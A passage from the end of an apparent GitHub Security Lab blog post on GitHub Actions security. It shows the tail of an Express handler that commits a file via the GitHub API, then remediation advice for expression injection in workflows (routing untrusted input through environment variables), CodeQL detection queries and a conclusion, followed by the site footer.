      <span class="na">repo</span><span class="p">:</span>    <span class="nx">repo</span><span class="p">,</span>
      <span class="na">branch</span><span class="p">:</span>  <span class="nx">branchName</span><span class="p">,</span>
      <span class="na">path</span><span class="p">:</span>    <span class="nx">path</span><span class="p">,</span>
      <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bump dependencies</span><span class="dl">'</span><span class="p">,</span>
      <span class="na">content</span><span class="p">:</span> <span class="nx">fileContent</span><span class="p">,</span>
      <span class="na">sha</span><span class="p">:</span>     <span class="nx">content</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">sha</span>
    <span class="p">});</span>

    <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
    <span class="nf">next</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">next</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<h2 id="remediation">Remediation</h2>

<p>The best practice to avoid code and command injection vulnerabilities in GitHub workflows is to set the untrusted input value of the expression to an intermediate environment variable:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">print title</span>
  <span class="na">env</span><span class="pi">:</span>
    <span class="na">TITLE</span><span class="pi">:</span> <span class="s">${{ github.event.issue.title }}</span>
  <span class="na">run</span><span class="pi">:</span> <span class="s">echo "$TITLE"</span>
</code></pre></div></div>

<p>This way, the value of the <code class="language-plaintext highlighter-rouge">${{ github.event.issue.title }}</code> expression is stored in memory and used as variable instead of influencing the generation of script. As a side note, it is a good idea to double quote shell variables to avoid <a href="https://github.com/koalaman/shellcheck/wiki/SC2086">word splitting</a>, but this is <a href="https://docs.github.com/en/actions/reference/encrypted-secrets#using-encrypted-secrets-in-a-workflow">one</a> of <a href="https://mywiki.wooledge.org/BashPitfalls">many</a> general recommendations for writing shell scripts, not specific to GitHub Actions.</p>

<p>In order to catch and prevent the usage of the dangerous patterns as early as possible in the development lifecycle, the GitHub Security Lab has developed <a href="https://github.com/github/codeql/tree/main/javascript/ql/src/experimental/Security/CWE-094">CodeQL queries</a> that can be <a href="https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#running-additional-queries">integrated</a> by repository owners into their <a href="https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/about-code-scanning">CI/CD pipeline</a>. Please note that currently the scripts depend on the CodeQL JavaScript libraries. In practice, this means that the analyzed repository must contain at least one JavaScript file and that CodeQL is <a href="https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#changing-the-languages-that-are-analyzed">configured to analyze this language</a>.</p>

<p>The <code class="language-plaintext highlighter-rouge">script_injections.ql</code> covers expression injections described in the article and is quite precise. However it doesn’t do data flow tracking between workflow steps. The <code class="language-plaintext highlighter-rouge">pull_request_target.ql</code> results require more manual review to identify if the code from pull request is actually treated in an unsafe manner as was explained in <a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">the previous post</a>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>When writing custom GitHub Actions and workflows, consider that your code will often run with repo write privileges on potentially untrusted input. Keep in mind that not all GitHub event context data can be trusted equally. By adopting the same defensive programming posture you would employ for any other privileged application code you can ensure that your GitHub workflows stay as secure as the actual projects they service.</p>

<p><em>This post is the second in a series of posts about GitHub Actions security. Read the <a href="https://securitylab.github.com/research/github-actions-building-blocks/">next post</a></em></p>


    </main>
  </div>

  <div></div>


  <footer class="sc-dVhcbM cBEMHy footer">
  <div class="container-xl py-10">
    <div class="d-flex flex-wrap flex-lg-nowrap flex-md-nowrap ">
      <div class="col-12 col-lg-5 mb-5">
        <a
          href="https://github.com/"
          data-ga-click="Footer, go to home, text:home"
          class="octicon-text-white"
          aria-label="Go to GitHub homepage"
        >
          <svg
            height="30"
            class="octicon octicon-logo-github"
            viewBox="0 0 45 16"
            version="1.1"
            width="84"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"
            ></path>
          </svg>
        </a>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Product</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://github.com/features"
              data-ga-click="Footer, go to features, text:features"
              class="link-item"
              >Features</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/security"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Security</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/team"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >Team</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/enterprise"
              data-ga-click="Footer, go to enterprise, text:enterprise"
              class="link-item"
              >Enterprise</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/customer-stories?type=enterprise"
              data-ga-click="Footer, go to customer stories, text:customer stories"
              class="link-item"
              >Customer stories</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/readme"
              data-ga-click="Footer, go to security, text:security"
              class="link-item"
              >The ReadME Project</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/pricing"
              data-ga-click="Footer, go to pricing, text:pricing"
              class="link-item"
              >Pricing</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Resources</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/github/roadmap"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item"
              >Roadmap</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://resources.github.com/devops/tools/compare/"
              data-ga-click="Footer, go to resources, text:resources"
              class="link-item text-nowrap"
              >Compare GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5  col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Platform</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              href="https://developer.github.com"
              data-ga-click="Footer, go to api, text:api"
              class="link-item"
              >Developer API</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://partner.github.com/"
              data-ga-click="Footer, go to partner, text:partner"
              class="link-item"
              >Partners</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://atom.io"
              data-ga-click="Footer, go to atom, text:atom"
              class="link-item"
              >Atom</a
            >
          </li>
          <li class="py-2">
            <a
              href="http://electron.atom.io/"
              data-ga-click="Footer, go to electron, text:electron"
              class="link-item"
              >Electron</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://desktop.github.com/"
              data-ga-click="Footer, go to desktop, text:desktop"
              class="link-item"
              >GitHub Desktop</a
            >
          </li>
        </ul>
      </div>
      <div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 ">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Support</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to help, text:docs"
              class="link-item"
              href="https://docs.github.com"
              >Docs</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.community"
              data-ga-click="Footer, go to community, text:community"
              class="link-item"
              >Community Forum</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://services.github.com/"
              data-ga-click="Footer, go to professional services, text:professional services"
              class="link-item"
              >Professional Services</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://skills.github.com/"
              data-ga-click="Footer, go to skills, text:skills"
              class="link-item"
              >GitHub Skills</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://githubstatus.com/"
              data-ga-click="Footer, go to status, text:status"
              class="link-item"
              >Status</a
            >
          </li>
          <li class="py-2">
            <a
              data-ga-click="Footer, go to contact, text:contact"
              class="link-item"
              href="https://support.github.com"
              >Contact GitHub</a
            >
          </li>
        </ul>
      </div>
      <div class="col-5 col-sm-3 col-lg-2 mb-6 mb-md-2 px-md-5 footer-column">
        <h2 class="h5 mb-4 text-mono text-white heading-text">Company</h2>
        <ul class="list-style-none color-link-secondary">
          <li class="py-2">
            <a
              data-ga-click="Footer, go to about, text:about"
              class="link-item"
              href="https://github.com/about"
              >About</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.blog"
              data-ga-click="Footer, go to blog, text:blog"
              class="link-item"
              >Blog</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Careers</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Press</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/careers"
              data-ga-click="Footer, go to careers, text:careers"
              class="link-item"
              >Inclusion</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://github.com/about/press"
              data-ga-click="Footer, go to press, text:press"
              class="link-item"
              >Social Impact</a
            >
          </li>
          <li class="py-2">
            <a
              href="https://shop.github.com"
              data-ga-click="Footer, go to shop, text:shop"
              class="link-item"
              >Shop</a
            >
          </li>
        </ul>
      </div>
    </div>
  </div>
  <div class="bottom-banner">
    <div
      class="container-xl py-4 d-sm-flex flex-wrap flex-justify-between flex-row-reverse flex-items-center"
    >
      <ul
        class="list-style-none d-flex flex-wrap flex-items-center mb-3 mb-sm-0 social-icons"
      >
        <li class="mr-3">
          <a
            href="https://twitter.com/github"
            data-ga-click="Footer, go to Twitter, text:twitter"
            title="GitHub on Twitter"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 273.5 222.3"
              class="d-block"
              height="18"
            >
              <path
                d="M273.5 26.3a109.77 109.77 0 0 1-32.2 8.8 56.07 56.07 0 0 0 24.7-31 113.39 113.39 0 0 1-35.7 13.6 56.1 56.1 0 0 0-97 38.4 54 54 0 0 0 1.5 12.8A159.68 159.68 0 0 1 19.1 10.3a56.12 56.12 0 0 0 17.4 74.9 56.06 56.06 0 0 1-25.4-7v.7a56.11 56.11 0 0 0 45 55 55.65 55.65 0 0 1-14.8 2 62.39 62.39 0 0 1-10.6-1 56.24 56.24 0 0 0 52.4 39 112.87 112.87 0 0 1-69.7 24 119 119 0 0 1-13.4-.8 158.83 158.83 0 0 0 86 25.2c103.2 0 159.6-85.5 159.6-159.6 0-2.4-.1-4.9-.2-7.3a114.25 114.25 0 0 0 28.1-29.1"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.facebook.com/GitHub"
            data-ga-click="Footer, go to Facebook, text:facebook"
            title="GitHub on Facebook"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 15.3 15.4"
              class="d-block"
              height="18"
            >
              <path
                d="M14.5 0H.8a.88.88 0 0 0-.8.9v13.6a.88.88 0 0 0 .8.9h7.3v-6h-2V7.1h2V5.4a2.87 2.87 0 0 1 2.5-3.1h.5a10.87 10.87 0 0 1 1.8.1v2.1h-1.3c-1 0-1.1.5-1.1 1.1v1.5h2.3l-.3 2.3h-2v5.9h3.9a.88.88 0 0 0 .9-.8V.8a.86.86 0 0 0-.8-.8z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.youtube.com/github"
            data-ga-click="Footer, go to YouTube, text:youtube"
            title="GitHub on YouTube"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19.17 13.6"
              class="d-block"
              height="16"
            >
              <path
                d="M18.77 2.13A2.4 2.4 0 0 0 17.09.42C15.59 0 9.58 0 9.58 0a57.55 57.55 0 0 0-7.5.4A2.49 2.49 0 0 0 .39 2.13 26.27 26.27 0 0 0 0 6.8a26.15 26.15 0 0 0 .39 4.67 2.43 2.43 0 0 0 1.69 1.71c1.52.42 7.5.42 7.5.42a57.69 57.69 0 0 0 7.51-.4 2.4 2.4 0 0 0 1.68-1.71 25.63 25.63 0 0 0 .4-4.67 24 24 0 0 0-.4-4.69zM7.67 9.71V3.89l5 2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li class="mr-3">
          <a
            href="https://www.linkedin.com/company/github"
            data-ga-click="Footer, go to Linkedin, text:linkedin"
            title="GitHub on Linkedin"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 19 18"
              class="d-block"
              height="18"
            >
              <path
                d="M3.94 2A2 2 0 1 1 2 0a2 2 0 0 1 1.94 2zM4 5.48H0V18h4zm6.32 0H6.34V18h3.94v-6.57c0-3.66 4.77-4 4.77 0V18H19v-7.93c0-6.17-7.06-5.94-8.72-2.91z"
                fill="currentColor"
              ></path>
            </svg>
          </a>
        </li>
        <li>
          <a
            href="https://github.com/github"
            data-ga-click="Footer, go to github's org, text:github"
            title="GitHub's organization"
          >
            <svg
              height="20"
              class="octicon octicon-mark-github d-block"
              viewBox="0 0 16 16"
              version="1.1"
              width="20"
              aria-hidden="true"
            >
              <path
                fill-rule="evenodd"
                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
              ></path>
            </svg>
          </a>
        </li>
      </ul>
      <ul class="list-style-none d-flex flex-wrap bottom-links-text">
        <li class="mr-3">
          GitHub Inc. ©
          <!-- -->2024<!-- -->
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-terms-of-service"
            data-ga-click="Footer, go to terms, text:terms"
            class="link-gray"
            >Terms</a
          >
        </li>
        <li class="mr-3">
          <a
            href="https://docs.github.com/en/github/site-policy/github-privacy-statement"
            data-ga-click="Footer, go to privacy, text:privacy"
            class="link-gray"
            >Privacy</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="#"
            data-ga-click="Footer, go to terms, text:sitemap"
            class="link-gray"
            >Sitemap</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md">
          <a
            href="https://github.com/git-guides"
            data-ga-click="Footer, go to terms, text:what is git"
            class="link-gray"
            >What is Git?</a
          >
        </li>
        <li class="mr-3 hide-sm hide-md"><a href="#" class="link-gray">Manage Cookies</a></li>
        <li class="mr-3 hide-sm hide-md">
          <a href="#" class="link-gray">Do not share my personal information</a>
        </li>
      </ul>
    </div>
  </div>
</footer>


  <!-- JAVASCRIPT -->
  <script src="/assets/js/main.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      if (document.body.classList.contains('page-blog')) {

      const eventFooter = document.querySelector('.event-footer');
      const mainFooter = document.querySelector('footer'); // Adjust this selector to match your footer element

      function checkFooterPosition() {
        const footerRect = mainFooter.getBoundingClientRect();
        const eventFooterRect = eventFooter.getBoundingClientRect();

        if (footerRect.top < window.innerHeight && footerRect.bottom >= 0) {
          eventFooter.style.position = 'relative';
          eventFooter.style.bottom = `0px`;
        } else {
          eventFooter.style.position = 'fixed';
          eventFooter.style.bottom = '0';
        }
      }

      window.addEventListener('scroll', checkFooterPosition);
      window.addEventListener('resize', checkFooterPosition);
      checkFooterPosition(); // Initial check
    }
    });
  </script>
</body>
</html>
